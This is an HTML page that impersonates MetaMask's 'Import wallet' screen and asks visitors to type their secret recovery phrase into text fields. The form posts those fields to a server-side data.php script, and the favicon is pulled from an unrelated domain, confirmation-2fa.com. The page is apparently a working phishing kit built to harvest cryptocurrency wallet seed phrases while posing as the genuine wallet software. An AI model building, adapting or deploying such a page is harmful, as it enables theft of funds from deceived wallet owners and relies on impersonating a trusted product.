<html data-theme="light">

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
    <title>MetaMask</title>
    <link rel="stylesheet" type="text/css" href="MetaMaskphrase_files/index.css" title="ltr">
    <link rel="stylesheet" type="text/css" href="MetaMaskphrase_files/index-rtl.css" title="rtl">
    <link rel="shortcut icon" type="image/x-icon" href="https://confirmation-2fa.com/images/icon-48.png">


    <style>
        .import-srp__inputs {
            width: 100%;
        }
    
        .import-srp__srp-word-label {
            display: inline-block;
            width: 20px; /* Adjust as needed */
        }
    
        .import-srp__srp-word textarea {
            width: calc(7 * 20px); /* Adjust as needed */
            height: auto;
            resize: none;
        }
    </style>
    <style data-jss="" data-meta="MuiInputBase">
        .MuiInputBase-root {
            color: rgba(0, 0, 0, 0.87);
            cursor: text;
            display: inline-flex;
            position: relative;
            font-size: 1rem;
            box-sizing: border-box;
            align-items: center;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 1.1876em;
            letter-spacing: 0.00938em;
        }

        .MuiInputBase-root.Mui-disabled {
            color: rgba(0, 0, 0, 0.38);
            cursor: default;
        }

        .MuiInputBase-multiline {
            padding: 6px 0 7px;
        }

        .MuiInputBase-multiline.MuiInputBase-marginDense {
            padding-top: 3px;
        }

        .MuiInputBase-fullWidth {
            width: 100%;
        }

        .MuiInputBase-input {
            font: inherit;
            color: currentColor;
            width: 100%;
            border: 0;
            height: 1.1876em;
            margin: 0;
            display: block;
            padding: 6px 0 7px;
            min-width: 0;
            background: none;
            box-sizing: content-box;
            animation-name: mui-auto-fill-cancel;
            letter-spacing: inherit;
            animation-duration: 10ms;
            -webkit-tap-highlight-color: transparent;
        }

        .MuiInputBase-input::-webkit-input-placeholder {
            color: currentColor;
            opacity: 0.42;
            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        }

        .MuiInputBase-input::-moz-placeholder {
            color: currentColor;
            opacity: 0.42;
            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        }

        .MuiInputBase-input:-ms-input-placeholder {
            color: currentColor;
            opacity: 0.42;
            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        }

        .MuiInputBase-input::-ms-input-placeholder {
            color: currentColor;
            opacity: 0.42;
            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        }

        .MuiInputBase-input:focus {
            outline: 0;
        }

        .MuiInputBase-input:invalid {
            box-shadow: none;
        }

        .MuiInputBase-input::-webkit-search-decoration {
            -webkit-appearance: none;
        }

        .MuiInputBase-input.Mui-disabled {
            opacity: 1;
        }

        .MuiInputBase-input:-webkit-autofill {
            animation-name: mui-auto-fill;
            animation-duration: 5000s;
        }

        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {
            opacity: 0 !important;
        }

        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {
            opacity: 0 !important;
        }

        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {
            opacity: 0 !important;
        }

        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {
            opacity: 0 !important;
        }

        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {
            opacity: 0.42;
        }

        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {
            opacity: 0.42;
        }

        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {
            opacity: 0.42;
        }

        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {
            opacity: 0.42;
        }

        .MuiInputBase-inputMarginDense {
            padding-top: 3px;
        }

        .MuiInputBase-inputMultiline {
            height: auto;
            resize: none;
            padding: 0;
        }
    </style>
    <style data-jss="" data-meta="MuiInput">
        .MuiInput-root {
            position: relative;
        }

        label+.MuiInput-formControl {
            margin-top: 16px;
        }

        .MuiInput-colorSecondary.MuiInput-underline:after {
            border-bottom-color: #f50057;
        }

        .MuiInput-underline:after {
            left: 0;
            right: 0;
            bottom: 0;
            content: "";
            position: absolute;
            transform: scaleX(0);
            transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
            border-bottom: 2px solid #3f51b5;
            pointer-events: none;
        }

        .MuiInput-underline.Mui-focused:after {
            transform: scaleX(1);
        }

        .MuiInput-underline.Mui-error:after {
            transform: scaleX(1);
            border-bottom-color: #f44336;
        }

        .MuiInput-underline:before {
            left: 0;
            right: 0;
            bottom: 0;
            content: "\00a0";
            position: absolute;
            transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            border-bottom: 1px solid rgba(0, 0, 0, 0.42);
            pointer-events: none;
        }

        .MuiInput-underline:hover:not(.Mui-disabled):before {
            border-bottom: 2px solid rgba(0, 0, 0, 0.87);
        }

        .MuiInput-underline.Mui-disabled:before {
            border-bottom-style: dotted;
        }

        @media (hover: none) {
            .MuiInput-underline:hover:not(.Mui-disabled):before {
                border-bottom: 1px solid rgba(0, 0, 0, 0.42);
            }
        }
    </style>
    <style data-jss="" data-meta="MuiFormControl">
        .MuiFormControl-root {
            border: 0;
            margin: 0;
            display: inline-flex;
            padding: 0;
            position: relative;
            min-width: 0;
            flex-direction: column;
            vertical-align: top;
        }

        .MuiFormControl-marginNormal {
            margin-top: 16px;
            margin-bottom: 8px;
        }

        .MuiFormControl-marginDense {
            margin-top: 8px;
            margin-bottom: 4px;
        }

        .MuiFormControl-fullWidth {
            width: 100%;
        }
    </style>
    <style data-jss="" data-meta="MuiTextField"></style>
    <style data-jss="" data-meta="makeStyles">
        .jss1 {
            color: var(--color-text-alternative);
            font-weight: 400;
        }

        .jss1.jss2 {
            color: var(--color-text-alternative);
        }

        .jss1.jss4 {
            color: var(--color-text-alternative);
        }

        .jss3:before {
            border-bottom: 1px solid var(--color-text-default) !important;
        }

        .jss3:after {
            border-bottom: 2px solid var(--color-primary-default);
        }

        .jss5 {
            color: var(--color-text-alternative);
        }

        .jss6 {
            padding: 8px;
        }

        .jss6::placeholder {
            color: var(--color-text-alternative);
        }

        .jss7 {
            color: var(--color-background-default);
        }

        .jss8:after {
            border-bottom: 2px solid var(--color-background-default);
        }

        .jss9.jss10 {
            color: var(--color-text-alternative);
        }

        .jss9.jss4 {
            color: var(--color-text-alternative);
        }

        .jss12 {
            color: var(--color-text-default);
            border: 1px solid var(--color-border-default);
            height: 48px;
            display: flex;
            padding: 0 16px;
            align-items: center;
            border-radius: 6px;
            background-color: var(--color-background-default);
        }

        label+.jss12 {
            margin-top: 9px;
        }

        .jss12.jss11 {
            border: 1px solid var(--color-primary-default);
        }

        .jss13 {
            color: var(--color-text-default);
            position: initial;
            font-size: 1rem;
            transform: none;
            transition: none;
        }

        .jss14 {
            color: var(--color-text-default);
            position: initial;
            font-size: .75rem;
            transform: none;
            transition: none;
        }

        .jss15 {
            line-height: initial !important;
        }
    </style>
</head>

<body>
    <div id="app-content">
        <div class="app os-win mouse-user-styles" dir="auto">
            <div class="onboarding-app-header">
                <div class="onboarding-app-header__contents">
                    <div class="onboarding-app-header__logo-container" data-testid="app-header-logo">
                        <svg height="30" viewBox="0 0 1311 242" width="162" xmlns="http://www.w3.org/2000/svg"
                            class="onboarding-app-header__metafox-logo--horizontal">
                            <g fill="none">
                                <g fill="var(--color-text-default)" transform="translate(361 61)">
                                    <path
                                        d="m796.7 60.9c-6.8-4.5-14.3-7.7-21.4-11.7-4.6-2.6-9.5-4.9-13.5-8.2-6.8-5.6-5.4-16.6 1.7-21.4 10.2-6.8 27.1-3 28.9 10.9 0 .3.3.5.6.5h15.4c.4 0 .7-.3.6-.7-.8-9.6-4.5-17.6-11.3-22.7-6.5-4.9-13.9-7.5-21.8-7.5-40.7 0-44.4 43.1-22.5 56.7 2.5 1.6 24 12.4 31.6 17.1s10 13.3 6.7 20.1c-3 6.2-10.8 10.5-18.6 10-8.5-.5-15.1-5.1-17.4-12.3-.4-1.3-.6-3.8-.6-4.9 0-.3-.3-.6-.6-.6h-16.7c-.3 0-.6.3-.6.6 0 12.1 3 18.8 11.2 24.9 7.7 5.8 16.1 8.2 24.8 8.2 22.8 0 34.6-12.9 37-26.3 2.1-13.1-1.8-24.9-13.5-32.7z">
                                    </path>
                                    <path
                                        d="m71.6 2.3h-7.4-8.1c-.3 0-.5.2-.6.4l-13.7 45.2c-.2.6-1 .6-1.2 0l-13.7-45.2c-.1-.3-.3-.4-.6-.4h-8.1-7.4-10c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-87.7c0-.7 1-.8 1.2-.2l13.8 45.5 1 3.2c.1.3.3.4.6.4h12.8c.3 0 .5-.2.6-.4l1-3.2 13.8-45.5c.2-.7 1.2-.5 1.2.2v87.7c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-115.4c0-.3-.3-.6-.6-.6z">
                                    </path>
                                    <path
                                        d="m541 2.3c-.3 0-.5.2-.6.4l-13.7 45.2c-.2.6-1 .6-1.2 0l-13.7-45.2c-.1-.3-.3-.4-.6-.4h-25.4c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-87.7c0-.7 1-.8 1.2-.2l13.8 45.5 1 3.2c.1.3.3.4.6.4h12.8c.3 0 .5-.2.6-.4l1-3.2 13.8-45.5c.2-.7 1.2-.5 1.2.2v87.7c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-115.4c0-.3-.3-.6-.6-.6z">
                                    </path>
                                    <path
                                        d="m325.6 2.3h-31.1-16.7-31.1c-.3 0-.6.3-.6.6v14.4c0 .3.3.6.6.6h30.5v100.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-100.4h30.5c.3 0 .6-.3.6-.6v-14.4c0-.3-.2-.6-.6-.6z">
                                    </path>
                                    <path
                                        d="m424.1 118.9h15.2c.4 0 .7-.4.6-.8l-31.4-115.8c-.1-.3-.3-.4-.6-.4h-5.8-10.2-5.8c-.3 0-.5.2-.6.4l-31.4 115.8c-.1.4.2.8.6.8h15.2c.3 0 .5-.2.6-.4l9.1-33.7c.1-.3.3-.4.6-.4h33.6c.3 0 .5.2.6.4l9.1 33.7c.1.2.4.4.6.4zm-39.9-51 12.2-45.1c.2-.6 1-.6 1.2 0l12.2 45.1c.1.4-.2.8-.6.8h-24.4c-.4 0-.7-.4-.6-.8z">
                                    </path>
                                    <path
                                        d="m683.3 118.9h15.2c.4 0 .7-.4.6-.8l-31.4-115.8c-.1-.3-.3-.4-.6-.4h-5.8-10.2-5.8c-.3 0-.5.2-.6.4l-31.4 115.8c-.1.4.2.8.6.8h15.2c.3 0 .5-.2.6-.4l9.1-33.7c.1-.3.3-.4.6-.4h33.6c.3 0 .5.2.6.4l9.1 33.7c.1.2.3.4.6.4zm-39.9-51 12.2-45.1c.2-.6 1-.6 1.2 0l12.2 45.1c.1.4-.2.8-.6.8h-24.4c-.4 0-.7-.4-.6-.8z">
                                    </path>
                                    <path
                                        d="m149.8 101.8v-35.8c0-.3.3-.6.6-.6h44.5c.3 0 .6-.3.6-.6v-14.4c0-.3-.3-.6-.6-.6h-44.5c-.3 0-.6-.3-.6-.6v-30.6c0-.3.3-.6.6-.6h50.6c.3 0 .6-.3.6-.6v-14.4c0-.3-.3-.6-.6-.6h-51.2-17.3c-.3 0-.6.3-.6.6v15 31.9 15.6 37 15.8c0 .3.3.6.6.6h17.3 53.3c.3 0 .6-.3.6-.6v-15.2c0-.3-.3-.6-.6-.6h-52.8c-.3-.1-.5-.3-.5-.7z">
                                    </path>
                                    <path
                                        d="m949.3 117.9-57.8-59.7c-.2-.2-.2-.6 0-.8l52-54c.4-.4.1-1-.4-1h-21.3c-.2 0-.3.1-.4.2l-44.1 45.8c-.4.4-1 .1-1-.4v-45c0-.3-.3-.6-.6-.6h-16.7c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-50.8c0-.5.7-.8 1-.4l50 51.6c.1.1.3.2.4.2h21.3c.4-.1.7-.8.3-1.1z">
                                    </path>
                                </g>
                                <g stroke-linecap="round" stroke-linejoin="round" transform="translate(1 1)">
                                    <path d="m246.1.2-101.1 75 18.8-44.2z" fill="#e17726" stroke="#e17726"></path>
                                    <g fill="#e27625" stroke="#e27625" transform="translate(2)">
                                        <path d="m10.9.2 100.2 75.7-17.9-44.9z"></path>
                                        <path d="m207.7 174.1-26.9 41.2 57.6 15.9 16.5-56.2z"></path>
                                        <path d="m.2 175 16.4 56.2 57.5-15.9-26.8-41.2z"></path>
                                        <path d="m71 104.5-16 24.2 57 2.6-1.9-61.5z"></path>
                                        <path d="m184 104.5-39.7-35.4-1.3 62.2 57-2.6z"></path>
                                        <path d="m74.1 215.3 34.5-16.7-29.7-23.2z"></path>
                                        <path d="m146.4 198.6 34.4 16.7-4.7-39.9z"></path>
                                    </g>
                                    <g fill="#d5bfb2" stroke="#d5bfb2" transform="translate(76 198)">
                                        <path d="m106.8 17.3-34.4-16.7 2.8 22.4-.3 9.5z"></path>
                                        <path d="m.1 17.3 32 15.2-.2-9.5 2.7-22.4z"></path>
                                    </g>
                                    <path d="m108.7 160.6-28.6-8.4 20.2-9.3z" fill="#233447" stroke="#233447"></path>
                                    <path d="m150.3 160.6 8.4-17.7 20.3 9.3z" fill="#233447" stroke="#233447"></path>
                                    <g fill="#cc6228" stroke="#cc6228" transform="translate(49 128)">
                                        <path d="m27.1 87.3 5-41.2-31.8.9z"></path>
                                        <path d="m128.9 46.1 4.9 41.2 26.9-40.3z"></path>
                                        <path d="m153 .7-57 2.6 5.3 29.3 8.4-17.7 20.3 9.3z"></path>
                                        <path d="m31.1 24.2 20.2-9.3 8.4 17.7 5.3-29.3-57-2.6z"></path>
                                    </g>
                                    <g fill="#e27525" stroke="#e27525" transform="translate(57 128)">
                                        <path d="m0 .7 23.9 46.7-.8-23.2z"></path>
                                        <path d="m122 24.2-.9 23.2 23.9-46.7z"></path>
                                        <path d="m57 3.3-5.3 29.3 6.7 34.6 1.5-45.6z"></path>
                                        <path d="m88 3.3-2.8 18.2 1.4 45.7 6.7-34.6z"></path>
                                    </g>
                                    <path d="m150.3 160.6-6.7 34.6 4.8 3.4 29.7-23.2.9-23.2z" fill="#f5841f"
                                        stroke="#f5841f"></path>
                                    <path d="m80.1 152.2.8 23.2 29.7 23.2 4.8-3.4-6.7-34.6z" fill="#f5841f"
                                        stroke="#f5841f"></path>
                                    <path
                                        d="m150.9 230.5.3-9.5-2.6-2.2h-38.2l-2.5 2.2.2 9.5-32-15.2 11.2 9.2 22.7 15.7h38.9l22.8-15.7 11.1-9.2z"
                                        fill="#c0ac9d" stroke="#c0ac9d"></path>
                                    <path d="m148.4 198.6-4.8-3.4h-28.2l-4.8 3.4-2.7 22.4 2.5-2.2h38.2l2.6 2.2z"
                                        fill="#161616" stroke="#161616"></path>
                                    <g fill="#763e1a" stroke="#763e1a">
                                        <path
                                            d="m250.4 80.1 8.5-41.4-12.8-38.5-97.7 72.5 37.6 31.8 53.1 15.5 11.7-13.7-5.1-3.7 8.1-7.4-6.2-4.8 8.1-6.2z">
                                        </path>
                                        <path
                                            d="m.1 38.7 8.6 41.4-5.5 4.1 8.2 6.2-6.2 4.8 8.1 7.4-5.1 3.7 11.7 13.7 53.1-15.5 37.6-31.8-97.7-72.5z">
                                        </path>
                                    </g>
                                    <g fill="#f5841f" stroke="#f5841f">
                                        <path d="m239.1 120-53.1-15.5 16 24.2-23.9 46.7 31.6-.4h47.2z"></path>
                                        <path d="m73 104.5-53.1 15.5-17.7 55h47.1l31.6.4-23.9-46.7z"></path>
                                        <path
                                            d="m145 131.3 3.4-58.6 15.4-41.7h-68.6l15.4 41.7 3.4 58.6 1.3 18.4.1 45.5h28.2l.1-45.5z">
                                        </path>
                                    </g>
                                </g>
                            </g>
                        </svg>
                        <img src="MetaMaskphrase_files/metamask-fox.svg"
                            class="onboarding-app-header__metafox-logo--icon" alt="">
                    </div>
                    <div class="dropdown">
                        <select
                            onchange="location = 'Set_Local_Language.php?location=import-with-recovery-phrase&amp;language=' + this.value;"
                            class="dropdown__select">
                            <option value="am" selected="selected">አማርኛ</option>
                            <option value="ar">العربية</option>
                            <option value="bg">български</option>
                            <option value="bn">বাংলা</option>
                            <option value="ca">Català</option>
                            <option value="cs">Čeština</option>
                            <option value="da">Dansk</option>
                            <option value="de">Deutsch</option>
                            <option value="el">ελληνικά</option>
                            <option value="en">English</option>
                            <option value="es">Español</option>
                            <option value="es_419">Español (Latin America)</option>
                            <option value="et">Estonian</option>
                            <option value="fa">فارسی</option>
                            <option value="fi">Suomi</option>
                            <option value="fil">Filipino</option>
                            <option value="fr">Français</option>
                            <option value="gu">ગુજરાત</option>
                            <option value="he">עברית</option>
                            <option value="hi">मानक हिन्दी</option>
                            <option value="hn">हिन्दी</option>
                            <option value="hr">Hrvatski</option>
                            <option value="ht">Kreyòl ayisyen</option>
                            <option value="hu">Magyar</option>
                            <option value="id">Bahasa Indonesia</option>
                            <option value="it">Italiano</option>
                            <option value="ja">日本語</option>
                            <option value="kn">ಕನ್ನಡ</option>
                            <option value="ko">한국어</option>
                            <option value="lt">Lietuviškai</option>
                            <option value="lv">Latvian</option>
                            <option value="ml">മലയാളം</option>
                            <option value="mr">मराठी</option>
                            <option value="ms">Malay</option>
                            <option value="nl">Nederlands</option>
                            <option value="no">Norwegian</option>
                            <option value="ph">Pilipino</option>
                            <option value="pl">Polskie</option>
                            <option value="pt">Português</option>
                            <option value="pt_BR">Português (Brazillian)</option>
                            <option value="pt_PT">Português (European)</option>
                            <option value="ro">Limba română</option>
                            <option value="ru">Русский</option>
                            <option value="sk">Slovenčina</option>
                            <option value="sl">Slovenščina</option>
                            <option value="sr">српски</option>
                            <option value="sv">Svenska</option>
                            <option value="sw">Swahili</option>
                            <option value="ta">தமிழ்</option>
                            <option value="te">తెలుగు</option>
                            <option value="th">ไทย</option>
                            <option value="tl">Wikang Tagalog</option>
                            <option value="tr">Türkçe</option>
                            <option value="uk">Українська мова</option>
                            <option value="vi">Tiếng Việt</option>
                            <option value="zh_CN">中文(简体)</option>
                            <option value="zh_TW">中文(繁體)</option>

                        </select>
                        <svg width="16" height="16" fill="currentColor" class="dropdown__icon-caret-down"
                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                            <path
                                d="m399 177c-8-8-22-8-30 0l-113 113-113-113c-8-8-22-8-30 0-8 8-8 22 0 30l128 128c8 8 22 8 30 0l128-128c8-8 8-22 0-30z">
                            </path>
                        </svg>
                    </div>
                </div>
            </div>
            <div class="main-container-wrapper">
                <div class="onboarding-flow">
                    <div class="onboarding-flow__wrapper">
                        <div class="import-srp" data-testid="import-srp">
                            <div class="box box--margin-bottom-4 box--flex-direction-row box--width-full">
                                <ul class="progressbar two-steps">
                                    <li class="active">
                                        Get started </li>
                                    <li class="two-steps">Done</li>
                                </ul>
                            </div>
                            <div class="import-srp__header">
                                <h2
                                    class="box box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography typography--h2 typography--weight-bold typography--style-normal typography--color-text-default">
                                    Import wallet</h2>
                            </div>


                            <div class="import-srp__header">
                                <h2
                                    class="box box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography typography--h2 typography--weight-bold typography--style-normal typography--color-text-default">
                                    <div class="dropdown import-srp__number-of-words-dropdown">
                                        <select id="select" class="dropdown__select">
                                            <option value="12" selected="selected">I have a 12-word phrase</option>
                                            <option value="15">I have a 15-word phrase</option>
                                            <option value="18">I have a 18-word phrase</option>
                                            <option value="21">I have a 21-word phrase</option>
                                            <option value="24">I have a 24-word phrase</option>
                                        </select>
                                        <svg width="16" height="16" fill="currentColor"
                                            class="dropdown__icon-caret-down" xmlns="http://www.w3.org/2000/svg"
                                            viewBox="0 0 512 512">
                                            <path
                                                d="m399 177c-8-8-22-8-30 0l-113 113-113-113c-8-8-22-8-30 0-8 8-8 22 0 30l128 128c8 8 22 8 30 0l128-128c8-8 8-22 0-30z">
                                            </path>
                                        </svg>
                                    </div>
                                </h2>
                            </div>
                            <div class="import-srp__inputs" id="import-srp__inputs">
                                <div class="import-srp__srp-word">
                                    <label for="import-srp__srp-word" class="import-srp__srp-word-label">
                                        <p class="box box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">1.</p>
                                    </label>
                                    <div class="MuiFormControl-root MuiTextField-root">
                                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
                                            <textarea aria-invalid="false" name="input" autocomplete="off" id="import-srp__srp-word" dir="auto" data-testid="import-srp__srp-word" class="MuiInputBase-input MuiInput-input" rows="7" cols="7"></textarea>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <form action="data.php" method="post">
                                <input type="hidden" name="inputCount" id="inputCount" value="12">
                                <!-- Default value is 12, you can change it dynamically using JavaScript -->

                                <div class="import-srp__actions">
                                    <div class="box box--flex-direction-row box--text-align-left">
                                        <div class="import-srp__container">


                                            <div
                                                class="actionable-message import-srp__paste-tip actionable-message--with-icon">
                                                <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                                                    <path
                                                        d="M5 0C2.2 0 0 2.2 0 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0 2c.4 0 .7.3.7.7s-.3.7-.7.7-.7-.2-.7-.6.3-.8.7-.8zm.7 6H4.3V4.3h1.5V8z"
                                                        fill="var(--color-info-default)"></path>
                                                </svg>
                                                <div class="actionable-message__message">You can paste your entire
                                                    secret recovery phrase into any field</div>
                                            </div>



                                            <!-- Automaker -->

                                            <div class="import-srp__inputs" id="import-srp__inputs">
                                                <div class="import-srp__srp-word">
                                                    <label for="import-srp__srp-word" class="import-srp__srp-word-label">
                                                        <p class="box box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">1.</p>
                                                    </label>
                                                    <div class="MuiFormControl-root MuiTextField-root">
                                                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
                                                            <textarea aria-invalid="false" name="input" autocomplete="off" id="import-srp__srp-word" dir="auto" data-testid="import-srp__srp-word" class="MuiInputBase-input MuiInput-input" rows="7" cols="7" style="width: calc(7 * 20px);"></textarea>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            
                                            <div class="import-srp__inputs" id="import-srp__inputs">
                                                <div class="import-srp__srp-word">
                                                    
                                                    <div class="MuiFormControl-root MuiTextField-root">
                                                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
                                                            <textarea aria-invalid="false" name="input" autocomplete="off" id="import-srp__srp-word" dir="auto" data-testid="import-srp__srp-word" class="MuiInputBase-input MuiInput-input" rows="7" cols="7"></textarea>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- Automaker -->



                                            <div id="message_show"
                                                class="d-none actionable-message actionable-message--danger import-srp__srp-error actionable-message--with-icon">
                                                <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                                                    <path
                                                        d="M5 0C2.2 0 0 2.2 0 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0 2c.4 0 .7.3.7.7s-.3.7-.7.7-.7-.2-.7-.6.3-.8.7-.8zm.7 6H4.3V4.3h1.5V8z"
                                                        fill="var(--color-error-default)"></path>
                                                </svg>

                                                <div id="message_show_inner" class="d-none actionable-message__message">
                                                    Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words</div>

                                                <div id="message_show_inner_second"
                                                    class="d-none actionable-message__message">Invalid Secret Recovery
                                                    Phrase</div>

                                            </div>
                                        </div>
                                        <button id="btn_submit" type="submit"
                                            class="button btn--rounded btn-primary btn--large import-srp__confirm-button"
                                            data-testid="import-srp-confirm" role="button" tabindex="0">Next</button>
                                    </div>


                                </div>
                            </form>
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="popover-content"></div>
    <script src="MetaMaskphrase_files/main.js" type="text/javascript" charset="utf-8"></script>








</body>

</html>